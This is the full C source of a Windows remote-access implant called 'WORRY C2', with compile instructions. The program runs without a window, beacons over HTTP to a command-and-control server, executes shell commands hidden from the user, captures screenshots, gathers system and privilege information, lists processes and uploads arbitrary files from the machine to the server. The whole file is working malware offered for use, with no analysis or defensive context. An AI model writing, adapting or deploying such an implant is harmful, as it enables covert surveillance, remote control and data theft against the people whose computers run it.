// ============================================================
//  WORRY C2 — Windows Implant (Client)
// ============================================================
//  Connects to C2 server, beacons for commands, executes them.
//  Compile: x86_64-w64-mingw32-gcc -O2 -s -mwindows -o implant.exe c2_client.c -lwininet -lgdi32
// ============================================================

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// ---- Configuration ----
#define C2_HOST     "127.0.0.1"
#define C2_PORT     4444
#define BEACON_SEC  5
#define UA          "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#define MAX_RESP    (4 * 1024 * 1024)   // 4 MB max response buffer

// ---- Globals ----
static char g_id[64];
static char g_host[256];
static char g_user[256];
static HINTERNET g_inet = NULL;

// ---- Generate client ID from hostname + username hash ----
static void gen_id(void) {
    DWORD sz;
    sz = sizeof(g_host);
    GetComputerNameA(g_host, &sz);
    sz = sizeof(g_user);
    GetUserNameA(g_user, &sz);

    // djb2 hash of hostname+user
    unsigned long h = 5381;
    for (char *p = g_host; *p; p++) h = ((h << 5) + h) + (unsigned char)*p;
    for (char *p = g_user; *p; p++) h = ((h << 5) + h) + (unsigned char)*p;

    // Mix in tick count for uniqueness across sessions
    DWORD tick = GetTickCount();
    h ^= tick;

    wsprintfA(g_id, "%08lx%08lx", h, tick);
}

// ---- HTTP helpers ----
static BOOL http_init(void) {
    g_inet = InternetOpenA(UA, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    return g_inet != NULL;
}

static HINTERNET http_connect(void) {
    return InternetConnectA(g_inet, C2_HOST, C2_PORT,
                            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
}

// GET request, returns malloc'd buffer + sets *out_len. Caller frees.
static char* http_get(const char *path, DWORD *out_len) {
    HINTERNET hConn = http_connect();
    if (!hConn) return NULL;

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", path, NULL, NULL, NULL,
                                       INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hReq) { InternetCloseHandle(hConn); return NULL; }

    if (!HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return NULL;
    }

    char *buf = (char*)malloc(MAX_RESP);
    DWORD total = 0, rd = 0;
    while (InternetReadFile(hReq, buf + total, MAX_RESP - total - 1, &rd) && rd > 0) {
        total += rd;
        if (total >= MAX_RESP - 1) break;
    }
    buf[total] = '\0';
    if (out_len) *out_len = total;

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    return buf;
}

// POST request with raw body data
static BOOL http_post(const char *path, const void *data, DWORD data_len) {
    HINTERNET hConn = http_connect();
    if (!hConn) return FALSE;

    HINTERNET hReq = HttpOpenRequestA(hConn, "POST", path, NULL, NULL, NULL,
                                       INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hReq) { InternetCloseHandle(hConn); return FALSE; }

    const char *hdrs = "Content-Type: application/octet-stream\r\n";
    BOOL ok = HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs), (LPVOID)data, data_len);

    // Read response to complete the request
    char tmp[256];
    DWORD rd;
    while (InternetReadFile(hReq, tmp, sizeof(tmp), &rd) && rd > 0);

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    return ok;
}

// Send result back to C2
static void send_result(const char *cmd, const char *extra, const void *data, DWORD len) {
    char path[1024];
    if (extra && extra[0])
        wsprintfA(path, "/r/%s/%s/%s", g_id, cmd, extra);
    else
        wsprintfA(path, "/r/%s/%s", g_id, cmd);
    http_post(path, data, len);
}

// ---- Command: shell ----
static void cmd_shell(const char *command) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.wShowWindow = SW_HIDE;

    char cmdline[4096];
    wsprintfA(cmdline, "cmd.exe /c %s", command);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        const char *err = "[-] CreateProcess failed\n";
        send_result("shell", NULL, err, (DWORD)strlen(err));
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return;
    }
    CloseHandle(hWrite);

    // Read output
    char *out = (char*)malloc(MAX_RESP);
    DWORD total = 0, rd;
    while (ReadFile(hRead, out + total, MAX_RESP - total - 1, &rd, NULL) && rd > 0) {
        total += rd;
        if (total >= MAX_RESP - 1) break;
    }
    out[total] = '\0';

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    send_result("shell", NULL, out, total);
    free(out);
}

// ---- Command: screenshot ----
static void cmd_screenshot(void) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    // Build BMP in memory
    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    int row = ((w * 3 + 3) & ~3);
    DWORD img_size = row * h;
    bi.biSizeImage = img_size;

    BITMAPFILEHEADER bf;
    ZeroMemory(&bf, sizeof(bf));
    bf.bfType = 0x4D42; // 'BM'
    bf.bfOffBits = sizeof(bf) + sizeof(bi);
    bf.bfSize = bf.bfOffBits + img_size;

    BYTE *pixels = (BYTE*)malloc(img_size);
    GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DWORD total = sizeof(bf) + sizeof(bi) + img_size;
    BYTE *bmp_data = (BYTE*)malloc(total);
    memcpy(bmp_data, &bf, sizeof(bf));
    memcpy(bmp_data + sizeof(bf), &bi, sizeof(bi));
    memcpy(bmp_data + sizeof(bf) + sizeof(bi), pixels, img_size);

    send_result("screenshot", NULL, bmp_data, total);

    free(bmp_data);
    free(pixels);
    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}

// ---- Command: sysinfo ----
static void cmd_sysinfo(void) {
    char buf[4096];
    int pos = 0;

    // Computer name + user
    pos += wsprintfA(buf + pos, "Hostname : %s\n", g_host);
    pos += wsprintfA(buf + pos, "Username : %s\n", g_user);

    // OS version
    OSVERSIONINFOA ov;
    ov.dwOSVersionInfoSize = sizeof(ov);
    #pragma warning(suppress:4996)
    GetVersionExA(&ov);
    pos += wsprintfA(buf + pos, "OS       : Windows %lu.%lu (Build %lu)\n",
                     ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    // Architecture
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char *arch = "Unknown";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) arch = "x64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) arch = "x86";
    else if (si.wProcessorArchitecture == 12) arch = "ARM64";
    pos += wsprintfA(buf + pos, "Arch     : %s\n", arch);
    pos += wsprintfA(buf + pos, "CPUs     : %lu\n", si.dwNumberOfProcessors);

    // Memory
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    pos += wsprintfA(buf + pos, "RAM      : %lu MB total, %lu MB free\n",
                     (DWORD)(ms.ullTotalPhys / (1024*1024)),
                     (DWORD)(ms.ullAvailPhys / (1024*1024)));

    // Current directory
    char cwd[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, cwd);
    pos += wsprintfA(buf + pos, "CWD      : %s\n", cwd);

    // Privileges check (rough - are we admin?)
    BOOL isAdmin = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD sz;
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &sz))
            isAdmin = elev.TokenIsElevated;
        CloseHandle(hToken);
    }
    pos += wsprintfA(buf + pos, "Elevated : %s\n", isAdmin ? "Yes" : "No");

    send_result("sysinfo", NULL, buf, (DWORD)pos);
}

// ---- Command: ps (process list) ----
static void cmd_ps(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        const char *err = "[-] Snapshot failed\n";
        send_result("ps", NULL, err, (DWORD)strlen(err));
        return;
    }

    char *buf = (char*)malloc(MAX_RESP);
    int pos = 0;

    pos += wsprintfA(buf + pos, "  %-8s  %-8s  %s\n", "PID", "PPID", "Name");
    pos += wsprintfA(buf + pos, "  %-8s  %-8s  %s\n", "---", "----", "----");

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (pos < MAX_RESP - 512) {
                pos += wsprintfA(buf + pos, "  %-8lu  %-8lu  %s\n",
                                 pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    send_result("ps", NULL, buf, (DWORD)pos);
    free(buf);
}

// ---- Command: download ----
static void cmd_download(const char *filepath) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[512];
        wsprintfA(err, "[-] Cannot open: %s (error %lu)\n", filepath, GetLastError());
        send_result("download", filepath, err, (DWORD)strlen(err));
        return;
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize == INVALID_FILE_SIZE || fsize > MAX_RESP) {
        const char *err = "[-] File too large or error\n";
        send_result("download", filepath, err, (DWORD)strlen(err));
        CloseHandle(hFile);
        return;
    }

    BYTE *data = (BYTE*)malloc(fsize);
    DWORD rd;
    ReadFile(hFile, data, fsize, &rd, NULL);
    CloseHandle(hFile);

    send_result("download", filepath, data, rd);
    free(data);
}

// ---- Command: cd ----
static void cmd_cd(const char *path) {
    char buf[512];
    if (SetCurrentDirectoryA(path)) {
        char cwd[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, cwd);
        wsprintfA(buf, "[+] %s\n", cwd);
    } else {
        wsprintfA(buf, "[-] Cannot cd to: %s (error %lu)\n", path, GetLastError());
    }
    send_result("cd", NULL, buf, (DWORD)strlen(buf));
}

// ---- Beacon loop ----
static void beacon_loop(void) {
    char path[512];
    wsprintfA(path, "/c/%s/%s/%s", g_id, g_host, g_user);

    while (1) {
        DWORD len = 0;
        char *resp = http_get(path, &len);

        if (resp && len > 0) {
            // Parse command:argument
            char *colon = strchr(resp, ':');
            if (colon) {
                *colon = '\0';
                char *cmd = resp;
                char *arg = colon + 1;

                if (strcmp(cmd, "none") == 0) {
                    // No command, just beacon
                }
                else if (strcmp(cmd, "shell") == 0) {
                    cmd_shell(arg);
                }
                else if (strcmp(cmd, "screenshot") == 0) {
                    cmd_screenshot();
                }
                else if (strcmp(cmd, "sysinfo") == 0) {
                    cmd_sysinfo();
                }
                else if (strcmp(cmd, "ps") == 0) {
                    cmd_ps();
                }
                else if (strcmp(cmd, "download") == 0) {
                    cmd_download(arg);
                }
                else if (strcmp(cmd, "cd") == 0) {
                    cmd_cd(arg);
                }
                else if (strcmp(cmd, "kill") == 0) {
                    free(resp);
                    return; // Exit loop = terminate implant
                }
            }
            free(resp);
        }

        Sleep(BEACON_SEC * 1000);
    }
}

// ---- Entry point (no console window) ----
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInstance; (void)hPrev; (void)lpCmd; (void)nShow;

    gen_id();

    if (!http_init()) return 1;

    beacon_loop();

    InternetCloseHandle(g_inet);
    return 0;
}
